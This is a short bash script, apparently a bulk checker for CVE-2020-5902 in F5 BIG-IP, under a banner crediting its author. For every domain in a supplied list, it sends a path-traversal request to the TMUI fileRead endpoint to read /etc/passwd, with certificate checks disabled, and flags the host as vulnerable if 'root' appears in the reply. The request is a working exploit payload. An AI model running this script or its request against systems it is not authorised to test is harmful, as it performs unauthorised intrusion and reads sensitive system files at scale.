

#reset color
reset=`tput sgr0`
red=`tput setaf 1`


echo   '''\033[0;32m
____________________________________________________________________________________________________________
                        __________.__                ._____________
                        \______   \__| ____          |   \______   \
                        |    |  _/  |/ ___ \  ______ |   ||     ___/
                        |    |   \  / /_/  > /_____/ |   ||    |
                        |______  /__\___   /         |___||____|
                                \/  /_____/CVE-2020-5902 UnAuth RCE Vuln
                                          Made with BasH
                      twitter.com/_D3LT4_                 github.com/GovindPalakkal
_____________________________________________________________________________________________________________
${reset}'''
echo "usage > cve-checker.sh /path_to_domian_list/list.txt"
for site in $(cat $1);
do
   curl --silent --insecure $site'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd' -m 3 | grep -q root && \
  printf '\033[0;31mVulnerable ' && echo "$site" || \
  printf '\033[0;32mNot Vulnhherable\n'
   #using curl to get the request and fetch out the status code
done

echo "------------------------------------- xxxxxxxx ------------------------------------- ${reset}"
